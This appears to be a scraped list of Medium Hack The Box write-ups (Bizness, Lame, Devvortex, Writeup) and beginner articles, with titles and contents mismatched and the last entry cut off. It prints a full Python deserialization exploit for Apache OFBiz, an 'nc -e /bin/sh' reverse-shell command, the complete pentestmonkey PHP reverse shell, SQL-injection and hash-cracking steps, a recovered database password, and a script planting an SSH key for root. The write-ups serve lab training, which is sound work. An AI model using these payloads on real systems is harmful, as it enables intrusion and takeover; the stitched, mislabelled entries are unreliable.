        "link": "https://medium.com/sonyamoisset/keep-calm-and-hack-the-box-lame-b36f818bdf32",
        "content": "import argparseimport loggingimport osimport subprocessimport base64import requestsimport urllib3# Disable SSL verification warning for simplicityurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)def validate_url(url):    \"\"\"    Validate the URL schema.    \"\"\"    if not url.startswith(\"http://\") and not url.startswith(\"https://\"):        raise ValueError(\"Invalid URL schema. Use 'http://' or 'https://'.\")def scan(url):    \"\"\"    Perform a basic scan on the specified URL.    \"\"\"    print(\"[+] Scanning started...\")    try:        target_url = f\"{url}/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y\"        response = requests.get(target_url, verify=False)        response.raise_for_status()  # Raise an HTTPError for bad responses (4xx or 5xx)        if \"PONG\" in response.text:            print(\"[+] Apache OFBiz instance seems to be vulnerable.\")        else:            print(\"[-] Apache OFBiz instance seems NOT to be vulnerable.\")    except requests.exceptions.RequestException as e:        print(f\"[-] LOG: An error occurred during the scan: {e}\")def get_encoded_payload(cmd):    \"\"\"    Generate an encoded payload based on the provided command.    \"\"\"    if not os.path.isfile(\"ysoserial-all.jar\"):        logging.error(\"[-] ysoserial-all.jar not found. Exiting.\")        exit(1)    print(\"[+] Generating payload...\")    try:        #print(f\"[+] Running the following command: {cmd}\")        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, text=False)        encoded_output = base64.b64encode(result.stdout).decode().replace(\"\\n\", \"\")        print(\"[+] Payload generated successfully.\")    except subprocess.CalledProcessError as e:        print(f\"[-] LOG: An error occurred during payload generation: {e}\")    return encoded_outputdef send_post_request(url, encoded_output):    \"\"\"    Send a POST request with a malicious serialized payload.    \"\"\"    print(\"[+] Sending malicious serialized payload...\")    try:        target_url = f\"{url}/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y\"        headers = {            \"Content-Type\": \"application/xml\",        }        xml_data = f\"\"\"<?xml version=\"1.0\"?>            <methodCall>              <methodName>Methodname</methodName>              <params>                <param>                  <value>                    <struct>                      <member>                        <name>test</name>                        <value>                          <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">{encoded_output}</serializable>                        </value>                      </member>                    </struct>                  </value>                </param>              </params>            </methodCall>        \"\"\"        response = requests.post(target_url, headers=headers, data=xml_data, verify=False)        if response.status_code == 200:            print(\"[+] The request has been successfully sent. Check the result of the command.\")        else:            print(\"[-] Failed to send the request. Check the connection or try again.\")    except requests.exceptions.RequestException as e:        print(f\"[-] LOG: An error occurred during the scan: {e}\")def main():    \"\"\"    Main function for executing the script.    \"\"\"    parser = argparse.ArgumentParser(description=\"Exploit script for Apache EFBiz auth vulnerability (CVE-2023-49070 and CVE-2023-51467).\")    parser.add_argument(\"--url\", required=True, help=\"EFBIZ's URL to send requests to.\")    parser.add_argument(\"--cmd\", help=\"Command to run on the remote server. Optional.\")    args = parser.parse_args()    url = args.url.rstrip('/')    validate_url(args.url)    if args.cmd is None:        scan(url)    else:        command = f\"java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial-all.jar CommonsBeanutils1 '{args.cmd}'\"        encoded_output = get_encoded_payload(command)        send_post_request(url, encoded_output)if __name__ == \"__main__\":    main()\nAnalyzing the python script here is a breakdown of what its doing:\n* Import necessary libraries: The script imports several Python libraries, including argparse for command-line argument parsing, logging for logging messages, os for interacting with the operating system, subprocess for running external commands, base64 for encoding and decoding data in Base64 format, requests for making HTTP requests, and urllib3 to disable SSL verification warnings.\n* Define a function validate_url(url) to check the URL schema: This function is used to ensure that the provided URL starts with either “http://” or “https://.\" If the URL does not match this format, it raises a ValueError.\n* Define a function scan(url) to perform a basic scan: This function constructs a target URL based on the provided URL and sends an HTTP GET request to it. It looks for the presence of “PONG” in the response text, indicating a vulnerability in the Apache OFBiz instance. If “PONG” is found, it prints that the instance seems to be vulnerable; otherwise, it prints that it’s not vulnerable.\n* Define a function get_encoded_payload(cmd) to generate an encoded payload: This function generates an encoded payload based on a provided command. It checks if the ysoserial-all.jar file exists and then runs the provided command using subprocess.run. It encodes the command’s output in Base64 format and returns the encoded payload as a string.\n* Define a function send_post_request(url, encoded_output) to send a POST request: This function constructs an XML-RPC POST request with a malicious serialized payload and sends it to a target URL. It sets the Content-Type header to “application/xml” and includes the encoded payload in the XML data. It checks the HTTP response status code to determine whether the request was successful.\n* Define the main() function: This is the main entry point of the script. It uses argparse to parse command-line arguments, including the target URL ( — url) and an optional command ( — cmd) to execute on the remote server. It validates the URL, and if no command is provided, it calls the scan() function to check for the Apache OFBiz vulnerability. If a command is provided, it generates the payload and sends the malicious request.\n* Execute the script if it’s the main module: The script checks if it’s being run as the main module (not imported as a library) and calls the main() function to start the execution.\nSince the script is allowing commands to be executed on the server I set up a netcat listener on my machine and when running the exploit I specified the netcat command to call back to my machine:\nOn my attack machine:\nIn another terminal window in the directory where the exploit resides:\npython3 exploit.py --url https://bizness.htb/ --cmd 'nc -e /bin/sh <your ip here> 4444'\nI got a shell as user ofbiz hell yeah! This shell sucked so I ran the following command to upgrade it to a more stable one:\n/usr/bin/script -qc /bin/bash /dev/null\nGetting root was hard for me. I ran to Linpeas and didn’t see anything that could lead me to finding privesc. I had to peek through files on the system to see if I could find a hash or password because I did notice that the Derby database was being used, so I went to the directory path where it was storing its .dat files.\nI ran this command to narrow down which files had “SHA” in them for a hash:\nThe file c54d0.dat had the hash I was looking for..\nfind /opt/ofbiz/runtime/data/derby/ofbiz/seg0 -type f -name “*.dat” -exec grep “SHA” {} \\;\nThe file c54d0.dat ended up having the hash I was looking for after some trial an error.\nThe next step is cracking the hash to obtain a password. I chopped the beginning strings of the hash “$SHA$d$” and converted them using Cyberchef; that way, I could run hashcat against it."
    },
    {
        "title": "Hack The Box (Bizness) | by Software Sinner - Medium",
        "link": "https://software-sinner.medium.com/hack-the-box-bizness-60728bcde635",
        "content": "Step 1 — Scanning the network\nThe first step before exploiting a machine is to do a little bit of scanning and reconnaissance.\nThis is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on that phase to get as much information as you could.\nI will use Nmap (Network Mapper). Nmap is a free and open source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.\nThere are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation here\nI use the following command to get a basic idea of what we are scanning\n-sV: Probe open ports to determine service/version info\n-O: Enable OS detection\n-F: Fast mode — Scan fewer ports than the default scan\n— version-light: Limit to most likely probes (intensity 2)\n10.10.10.3: IP address of the Lame box\nYou can also use Zenmap, which is the official Nmap Security Scanner GUI. It is a multi-platform, free and open source application which aims to make Nmap easy for beginners to use while providing advanced features for experienced Nmap users.\nI use a different set of commands to perform an intensive scan\n-A: Enable OS detection, version detection, script scanning, and traceroute\n-v: Increase verbosity level\n10.10.10.3: IP address of the Lame box\nIf you find the results a little bit too overwhelming, you can move to the Ports/Hosts tab to only get the open ports\nWe can see that there are 4 open ports:\nPort 21. File Transfer Protocol (FTP) control (command)\nPort 22. Secure Shell (SSH), secure logins, file transfers (scp, sftp) and port forwarding\nPort 139. NetBIOS Session Service\nPort 445. Microsoft-DS (Directory Services) SMB file sharing\nLet see what we can get with the first port\nStep 2 — The Vulnerable FTP\nWe will use Searchsploit to check if there’s any known vulnerability on vsftpd 2.3.4. Searchsploit is a command line search tool for Exploit Database\nI use the following command\nNow that we know that there is a vulnerability — Backdoor Command Execution — let’s try to exploit it\nWe will use Metasploit. It’s a penetration testing framework that makes hacking simple. It’s an essential tool for many attackers and defenders\nI launch Metasploit Framework on Kali and look for command I should use to launch the exploit\nI use the command to look for all the payloads available\nWe can see there are several different exploits but the one we’re interested in is number 4\nI use the following command for the exploit\nThis will launch the exploit. I use this command to display the available options\nYou can see that the remote host (RHOSTS) is not yet set. I will set both the remote host and the target as these two pieces of information are needed to run the exploit\nI use the following command to set the remote host using the IP address of HTB Lame box\nThen I set the target to 0 as displayed when I checked the options\nWe can now run the exploit\nUnfortunately we can see that even if the exploit is completed, no session was created. The vulnerability has been patched as mentioned here, in the description of the exploit.\nThis module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011.\nThe Exploit Database is a Common Vulnerabilities and Exposures (CVE) compliant archive of public exploits and corresponding vulnerable software, developed for use by penetration testers and vulnerability researchers. The aim is to serve the most comprehensive collection of exploits gathered through direct submissions, mailing lists, as well as other public sources, and present them in a freely-available and easy-to-navigate database. The Exploit Database is a repository for exploits and proof-of-concepts rather than advisories, making it a valuable resource for those who need actionable data right away\nWe need to find another way. Let’s have a look at another port!\nYou can read the whole article on freeCodeCamp News website"
    },
    {
        "title": "Hack The Box (Devvortex) - Software Sinner - Medium",
        "link": "https://software-sinner.medium.com/hack-the-box-devvortex-9cc1ad2961b5",
        "content": "In our previous Hack The Box in-person meetups in Lisbon and Oporto I had the opportunity of presenting HTB in all its splendor. We talked about #hackthebox history, what hacking is, where to start, how to learn, and the importance of the community.\nThe response was overwhelming. It was amazing to get together with experienced professionals and newcomers, we created an environment where everyone felt supported and welcomed.\nHTB Meetup — Lisbon\nHTB Meetup — Oporto\nFollowing these last couple of events, I got a lot of requests to suggest a kind of “roadmap” for those complete beginners in hacking and HTB.\nI decided to write a couple of articles suggesting my approach to HTB and hacking. Take these and they are, personal and subjective. This aims to be a “friendly conversation” like I was sharing these if I met you in person and we started talking about one of our favorite subjects, hacking that is.\nThis is the first part of our convo. I’ll be covering HTB Academy and leave you with a cliffhanger.\nI’m not going to talk about what is hacking. As we presented on our meetup r0adrunn3r from HTB did that in a stellar way in her impressive How to learn hacking: The (step-by-step) beginner’s bible for 2023.\nhackthebox.com/blog/learn-to-hack-beginners-bible\nStart here:\nThat’s the place to start if you’re a complete beginner. Start there and read it. Get fundamental answers for questions like:\n* What is hacking?\n* Can anyone learn how to hack?\n* Where should beginner hackers start? and many more.\nThe article is written in a way that’s informative and makes you feel welcomed and supported. She even discusses the hats hackers should be wearing. If you know me you know my take on that:\nhttps://www.hackthebox.com/blog/htb-community-manifesto , slide from HTB — Lisbon meetup\nRead the Community Manifesto:\nHTB is all about the importance of the community. A happy, non-toxic, open, educational, active, and passionate society for hackers.\nIt’s our ultimate responsibility to ensure our values. Promote respect and a safe place. We all are learners, we all struggle from time to time. In such a highly demanding field as cybersecurity, it’s essential to foster a helpful and supportive community. That’s the only way to grow and learn.\nTalk about learning:\nLearning in everything. This journey is above all about learning. So having a mindset where acquiring knowledge is your reward will help you in the long run.\nYou’ve seen the memes:\nGot this from a web search, there was no explicit author.\nI bet you can do the splits, but even Jean Claude Van Damme didn’t skip the fundamentals. Why should you?\nFundamentals! Fundamentals! Fundamentals! — HTB Academy\nThat’s right. Start learning now. Start with the fundamental cybersecurity skills. This is the beginning of your journey into hacking and the world of cybersecurity. Make sure you start with the proper foundations.\nCreate an account on Hack The Box Academy, this is without a doubt the perfect place for you to start. From complete beginners to seasoned professionals I can guarantee you that this is a resource you’ll be using throughout your career.\nHTB — Academy provides guided training and industry certifications. Companies from all over the world use this resource to train their professionals. Where should you start?\nHacker meets HTB — Academy, HTB — Academy this is hacker:\nGet acquainted with the platform and the learning process. This module will welcome you and guide you at the beginning of your learning journey at the Academy. Think of this as the tutorial stage of your favorite game.\nGot it! What’s next?\nLearn how to learn — the starting module:\nLearning Process created by Cry0l1t3\nIn this demanding and ever-changing field, prepare yourself for neverending study. Having methodologies and processes will not only optimize your learning but ensures your mental safety. Protect yourself from burnout, impostor syndrome… Be prepared. The amount of information can be overwhelming when you first start so you must keep yourself organized. Also, frustration is going to creep up on you, better be prepared to deal with it.\nTake notes:\nThat reminds me. Always take notes! I mean ALWAYS (yea, all caps). Start now, make it a habit. Take notes now, while learning. Take notes later, while hacking. This will not only improve your concept retention but you’ll be creating your knowledge base you can always refer to.\nChoose a note-taking app and start now:"
    },
    {
        "title": "Unleash Your Inner Hacker: Where to Start in Hack The ...",
        "link": "https://medium.com/@pedro.correia_8569/unleash-your-inner-hacker-where-to-start-in-hack-the-box-pt-2-13fa9db6a2d2",
        "content": "Hello hackers!!!As promised here’s the second part of my Unleash Your Inner Hacker: Where to Start in Hack The Box?\nIn the first part,we introduced the platform, we covered HTB Academy with suggested modules to get started right away. And above all, we talked about the importance of community.\nBear in mind that the tone of these articles should be perceived as a “friendly conversation” like I was sharing these if I met you in person and we started talking about one of our favorite subjects, hacking.\nHTB Meetup — Lisbon\nBy now you know that at the end of the day, it’s all about learning. You chose your HTB Academy modules, you studied them thoroughly you took your notes maybe you even attended a couple of meetups in person. You’re studying and practicing all of those concepts we talked about. But now you want to get down to business.\nslide from HTB — Lisbon meetup\nI’m with you. It’s time to get your feet wet. To get a real taste of things.\nwww.hackthebox.com/hacker/hacking-labs\nThese are virtual penetration testing labs, with simulating up-to-date security vulnerabilities and misconfiguration for you to train and explore.\nThis is the place where you’ll be testing the skills and knowledge you’ll acquire in your journey. What’s amazing about these labs is precisely the possibility of learning all the latest attack paths and exploit techniques. All in a safe, legal, and secure environment.\nI’m overwhelmed by the possibilities, so many options…\nEasy Elliot. The best place for your to start is precisely the STARTING POINT\nslide from HTB — Lisbon meetup\nThis is where you’ll learn the basics of Penetration Testing in an actionable, structured, comprehensive way. Yes, you’ll be hacking!\nThe machines/boxes you’ll be hacking in Starting Point are separated by Tiers according to their technical difficulty. Start with Tier 0 and build up from there.\nDoes this mean I will not need HTB Academy?\nHTB Academy will always be with you. As we discussed previously. Academy provides guided training and industry certifications. Companies from all over the world use this resource to train their professionals. A valuable resource from beginners to seasoned experts.\nYou can pair your STARTING POINThacking withyourHTB Academy studies and modules. Every Tier has an associated module from HTB Academy, these will give you the guidance you’ll need regarding the technology and subjects you have to learn and master in order to solve those machines.\nwww.hackthebox.com/hacker/hacking-labs\nTake it slow and steady. Do it in a structured way. What I mean by this is to resist the urge to ‘jump’ from machine to machine if you encounter difficulties. Be sure to solve them in order.\nDo not expect to solve a machine quickly and easily. It’s supposed to be a challenge. If you’re not fully understanding what you’re dealing with I recommend taking a step back, reading, practice those HTB Academy once again.\nYou can always refer to the official Walkthroughs HTB made available for every machine on Starting Point. It’s okay to use them. These provide learning opportunities. Just make sure you do not follow them blindly. Try to understand the concepts behind every step. Study them. Reproduce the steps by yourself, and try to anticipate the next step.\nHow To Play Machines\nIf you want a full, comprehensive rundown of navigating and interacting with HTB Labs I suggest taking a look at How to Play Machines by Ryan Gordon.\nYou are not alone!\nRemember to join the HTB community:\nFeel supported, and get involved. Either on Discord, Forum, or join a meetup group. If you’re near Portugal, let’s connect and join the next in-person meetup.\nHack The Box Meetup: Portugal\nTo be continued…\nIn part 3 We’ll start to drill down on more HTB features and the next steps. Reach out and tell me if this is something it might interest you.\nHack all the things! Have all the fun! This is the way!\nDisclaimer! This writeup contains affiliate links."
    },
    {
        "title": "Unleash Your Inner Hacker: Where to Start in Hack The ...",
        "link": "https://medium.com/@pedro.correia_8569/unleash-your-inner-hacker-where-to-start-in-hack-the-box-pt-1-994033ac3a6f",
        "content": "Writeup is an easy Linux box created by jkr on Hack The Box. The box has protections in place to prevent brute-force attacks. The skills required to complete this box are enumeration. The skills obtained from completing this box are process enumeration and path hijacking. Hello world, welcome to Haxez where today I will be explaining how I hacked the Hack The Box Writeup box.\nEnumerating Writeup\nFirst, I spawned the box and connected my attack box to the Hack The Box lab VPN. Next, I sent a ping to the target to ensure it was online and that I could talk to it. Once the box responded, I performed a Nmap scan targeting all ports. Furthermore, I also requested service versions, told it to run default scripts, gave it a minimum packet rate of 10,000, and told it to save the output in all formats named writeup. As you can see from the screenshot below, ports 22 for SSH and 80 for HTTP were open.\nsudo nmap -sC -sV -p- 10.129.95.203 --min-rate 10000 -oA writeup\nWeb Application Enumeration\nSince SSH was unlikely to be the intended attack vector, I moseyed on over to the web application for a gander. It’s… beautiful! The web application appeared to be an in-development blog for Hack The Box writeups. However, the application was being hit with denial-of-service attacks resulting in DoS protection mechanisms being implemented. The DoS protection blocks any IP that triggers a 400 error in the Apache log.\nDomo arigato, Mr Roboto\nDirb, gobuster, ffuf, and other directory and file brute force tools are noisy and would generate 400 errors resulting in an IP ban. Therefore, I had to manually and carefully enumerate the web application. One of the first files I look for when hacking web applications is the robots.txt file. It’s a file that tells search indexing robots to ignore the files contained within it. It prevents pages like admin or log-in from being indexed. However, it’s a double-edged sword as it may disclose sensitive information to malicious threat actors. Navigating to the robots.txt file I found a directory called writeup.\nEnumerating Writeup Technologies\nI navigated to the writeup directory which presented a basic web application with minimal functionality. There were several links to blog posts and clicking on those blog posts revealed that it was a PHP-based application. Furthermore, a parameter named page was being used to retrieve the blog posts. For example, visiting the following URL would retrieve a blog post called blue http://10.129.95.203/writeup/index.php?page=blue. I used whatweb to identify the CMS or Content Management System. As a result, I learned that it was using a version of CMS-Made-Simple from 2004–2019.\nFurthermore, looking at the structure of the CMS I found the location of the changelog file. Navigating to the file revealed the specific version of the CMS being used.\nCMS Made Simple Blind SQL Injection Failures\nUsing searchsploit to search for vulnerabilities impacting CMS Made Simple, I found a blind SQL injection vulnerability. The vulnerability has a CVE designation of CVE-2019–9053. I located the Python script and copied it to my current working directory. You can do this with the searchsploit -m flag to mirror it.\nUnfortunately, attempting to run this exploit produced errors regarding print statements. I wasn’t sure what to do here as I’m crap at Python. Fortunately, IppSecs video explained that I needed to install the termcolor module with pip. While this didn’t resolve the problem, it did point me in the right direction.\nFirst, I had to install pip2.7 which I was able to do by following the post >>HERE<<\nwget https://bootstrap.pypa.io/pip/2.7/get-pip.pysudo python2.7 get-pip.py\nHowever, when attempting to install termcolor, I received errors about an egg or something. After a bit more Google searching, I found this post >>HERE<< which explained I needed to upgrade setuptools.\npip install --upgrade setuptools\nCMS Made Simple Blind SQL Injection Success\nI was finally ready to run the payload. Using the following command, I was able to attack the SQL injection vulnerability and retrieve a salt, username, email address, and password hash. It was awesome watching the script come alive and iterate through the alphabet and pull the information out of the database.\npython2.7 46635.py --url http://10.129.95.203/writeup\nWriteup Foothold\nI echoed the hash followed by a colon, followed by the salt into a file called jkrhash.txt.\necho '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' > jkrhash.txt\nNext, I used hashcat with mode 20 (MD5 salt and password) to crack the hash with the wordlist rockyou.\nhashcat -a 0 -m 20 jkrhash.txt /usr/share/wordlists/rockyou.txt\nI was in, I was able to use the credentials to SSH to the box as the jkr user. Furthermore, once on the box, I was able to capture the user flag.\njkr@writeup:~$ cat user.txt8d0▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓9e9\nWriteup System Enumeration\nAfter grabbing the user flag, I started enumerating the system. First, I checked the command history of the jkr user to see if it contained anything interesting. It didn’t. Next, I checked if I could run sudo -l to see what commands jkr could run as sudo. Interestingly, sudo wasn’t found on the system. Finally, I decided to go for the easy option and ran linpeas. I span up a Python webserver and used wget to download it to the /tmp directory. Then, I gave it executable permissions and ran it.\nThe output kept highlighting the /usr/local path as a privilege escalation vector but I didn’t know why. After a bit more investigation, it seems that the jkr user is part of the staff group. According to the Debian wiki the staff group allows users to add local modifications to the system (/usr/local) without needing root privileges (note that executables in /usr/local/bin are in the PATH variable of any user, and they may “override” the executables in /bin and /usr/bin with the same name). As you can see from the screenshot below, /usr/local/bin is also the first path that gets called when executing files.\nWriteup Process Enumeration\nI’m still getting my head around this privilege escalation method if I’m honest. However, I think I understand it. To explain, the jkr user is a member of the staff group and the staff group has the ability to modify /usr/local/ without root privileges. If I can find a binary that gets executed as root without it using the absolute file path, then I can drop a malicious binary of the same name inside the /usr/local/bin directory. Then, when the conditions are met for the binary to be executed, my malicious binary gets executed with root privileges because my first environmental path is /usr/local/bin.\nWith that in mind, I ran pspy32 and found that when I log in to SSH with jkr, the run-parts binary is executed without an absolute file path. You can see it in the image below, the third blue line from the bottom.\nNext, I checked to see the ownership of the run-parts binary to see if it was owned by root. I used which to locate it and then ran ls -lash to list the permissions. Sure enough, it was owned by root and genuinely appeared to be the only binary not being executed with a full file path.\nWriteup Privilege Escalation\nIn theory, I should now be able to create my own binary or script called run-parts in /usr/local/bin. Then when I SSH to the system as jkr, my malicious run-parts binary will be executed instead of the one in /bin. There are multiple methods that I could have used to do this. For example, I could have created a script that copied the bash binary to /tmp and gave it setuid capabilities (I think). Additionally, I could have created a reverse shell that connected back to my machine. However, I thought the most reliable method was to drop an SSH key in the root user’s authorized_keys file. Plus, this is the method that IppSec used and it seemed to work.\nWhen the script is executed, it creates a file in /tmp called Exploit-Complete. This isn’t required as it’s just a visual indicator to show that the script was executed. Next, it creates the .ssh directory in the root user’s directory. Then, it echos my public key into the root user’s authorized_keys file. Finally, it gives the file 600 permissions. The script is saved as run-parts and saved to /usr/local/bin. I created it using nano.\n#!/bin/bashtouch /tmp/Exploit-Completemkdir /root/.sshecho 'ssh-rsa AAAA <<<SNIP>>> QqNzw9WKiU0= kali@kali' >> /root/.ssh/authorized_keyschmod 600 /root/.ssh/authorized_keys\nOnce the file was saved, I made it executable by running chmod +x against it. Then I created a new terminal tab and connected back to the box as the jkr user. I checked the /tmp directory and sure enough, the Exploit-Complete file had been created. Hopefully, that means that my public key is now in the root user’s authorized_keys files.\nFinally, I connected SSH as the root user using the private key I generated. I was able to login and grab the root flag.\n┌──(kali㉿kali)-[~/HTB/Writeup]└─$ ssh -i root root@10.129.95.203Last login: Fri Aug  6 08:59:19 2021root@writeup:~# cat root.txt786▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓4b4\nWriteup Learnings\nThis was a fun box which I learned a few things from. The first was getting the Python SQL injection payload to work. As soon as I received that first error I immediately thought that I wasn’t going to be able to complete the box. However, after a bit of persistence, the payload worked and left me with a big grin on my face. The cracking was fairly simple but always good to get some practice.\nThe system enumeration and privilege escalation was interesting. I didn’t know about the staff group before and without guides pointing me in the right direction, I wouldn’t have got it. I’m starting to understand the brilliance of pspy too, without it, I’m not sure how I would have identified the correct binary. Overall this is a good box and has a nice method for practicing different techniques for privilege escalation. You could change your binary to perform different things and then easily trigger it by connecting back to the box. Thanks, jkr, fun box."
    },
    {
        "title": "Hack The Box Writeup Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-writeup-writeup-338083ef9057",
        "content": "Let me give you a little breakdown of that this ruby code is doing:\n* Shebang Line: The script starts with a shebang line (#!/usr/bin/env ruby), indicating that it should be executed using the Ruby interpreter.\n* Exploit Information: The code includes comments that provide details about the exploit, such as its title, author, CVE identifier, and references to relevant websites and sources related to the vulnerability.\n* Required Libraries: The script requires several Ruby libraries, including json, httpx, docopt, and paint, which are used for various purposes, such as handling JSON data, making HTTP requests, parsing command-line arguments, and displaying colored output.\n* Docopt Usage and Options: The script defines a docopt usage section, which describes how to use the script and its command-line options. It specifies the required argument <url> and optional options like — debug, — no-color, and -h or — help.\n* Functions: The script defines several functions to perform specific tasks:\nfetch_users, parse_users, and display_users: These functions fetch and display information about Joomla! users from a given URL.fetch_config, parse_config, and display_config: These functions fetch and display configuration information about the Joomla! site.Main Execution Block: In the main part of the script, it:\n* Parses command-line arguments using docopt.Sets the display mode for colored output based on the — no-color option.Calls the functions to retrieve and display user and configuration information from the Joomla! site specified in the command-line argument.\n* Error Handling: The script includes basic error handling using begin and rescue blocks to catch and display any Docopt::Exit exceptions.\nIn summary, this Ruby script is designed to exploit a specific vulnerability in Joomla! (< 4.2.8) that allows unauthenticated users to disclose information about Joomla! users and site configuration. It retrieves and displays this information from the specified Joomla! site URL. It also provides command-line options for customization and error handling.\ngem install httpx docopt paintruby exploit.rb http://dev.devvortex.htb\nThe exploit puked out the user Lewis along with his password ;).\nDB user: lewisDB password: P4ntherg0t1n5r3c0n##\nI tried ssh with the creds and no luck so I moved on to the joomla admin interface on the web and was able to login as lewis.\nI googled authenticated attacks. I can perform on Jommla to get a shell, and reading back at the hacktricks article, you can target the templates to get a PHP reverse shell.\nUsing the pentestmonkey’s shell, I had to edit the code and add my IP address where it says “CHANGE THIS”.\n<?php// php-reverse-shell - A Reverse Shell implementation in PHP// Copyright (C) 2007 pentestmonkey@pentestmonkey.net//// This tool may be used for legal purposes only.  Users take full responsibility// for any actions performed using this tool.  The author accepts no liability// for damage caused by this tool.  If these terms are not acceptable to you, then// do not use this tool.//// In all other respects the GPL version 2 applies://// This program is free software; you can redistribute it and/or modify// it under the terms of the GNU General Public License version 2 as// published by the Free Software Foundation.//// This program is distributed in the hope that it will be useful,// but WITHOUT ANY WARRANTY; without even the implied warranty of// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the// GNU General Public License for more details.//// You should have received a copy of the GNU General Public License along// with this program; if not, write to the Free Software Foundation, Inc.,// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.//// This tool may be used for legal purposes only.  Users take full responsibility// for any actions performed using this tool.  If these terms are not acceptable to// you, then do not use this tool.//// You are encouraged to send comments, improvements or suggestions to// me at pentestmonkey@pentestmonkey.net//// Description// -----------// This script will make an outbound TCP connection to a hardcoded IP and port.// The recipient will be given a shell running as the current user (apache normally).//// Limitations// -----------// proc_open and stream_set_blocking require PHP version 4.3+, or 5+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.//// Usage// -----// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.set_time_limit (0);$VERSION = \"1.0\";$ip = '127.0.0.1';  // CHANGE THIS$port = 1234;       // CHANGE THIS$chunk_size = 1400;$write_a = null;$error_a = null;$shell = 'uname -a; w; id; /bin/sh -i';$daemon = 0;$debug = 0;//// Daemonise ourself if possible to avoid zombies later//// pcntl_fork is hardly ever available, but will allow us to daemonise// our php process and avoid zombies.  Worth a try...if (function_exists('pcntl_fork')) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) {  printit(\"ERROR: Can't fork\");  exit(1); } if ($pid) {  exit(0);  // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) {  printit(\"Error: Can't setsid()\");  exit(1); } $daemon = 1;} else { printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");}// Change to a safe directorychdir(\"/\");// Remove any umask we inheritedumask(0);//// Do the reverse shell...//// Open reverse connection$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) { printit(\"$errstr ($errno)\"); exit(1);}// Spawn shell process$descriptorspec = array(   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to);$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1);}// Set everything to non-blocking// Reason: Occsionally reads will block, even though stream_select tells us they won'tstream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit(\"Successfully opened reverse shell to $ip:$port\");while (1) { // Check for end of TCP connection if (feof($sock)) {  printit(\"ERROR: Shell connection terminated\");  break; } // Check for end of STDOUT if (feof($pipes[1])) {  printit(\"ERROR: Shell process terminated\");  break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process's STDIN if (in_array($sock, $read_a)) {  if ($debug) printit(\"SOCK READ\");  $input = fread($sock, $chunk_size);  if ($debug) printit(\"SOCK: $input\");  fwrite($pipes[0], $input); } // If we can read from the process's STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) {  if ($debug) printit(\"STDOUT READ\");  $input = fread($pipes[1], $chunk_size);  if ($debug) printit(\"STDOUT: $input\");  fwrite($sock, $input); } // If we can read from the process's STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) {  if ($debug) printit(\"STDERR READ\");  $input = fread($pipes[2], $chunk_size);  if ($debug) printit(\"STDERR: $input\");  fwrite($sock, $input); }}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);// Like print, but does nothing if we've daemonised ourself// (I can't figure out how to redirect STDOUT like a proper daemon)function printit ($string) { if (!$daemon) {  print \"$string\\n\"; }}?>\nI edited the following template in error.php:\nSet up a netcat listener on my attack machine:\nnc -lvp 1234"
    },
    {
        "title": "Hack The Box Love Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-love-writeup-d58982ffa4ec",
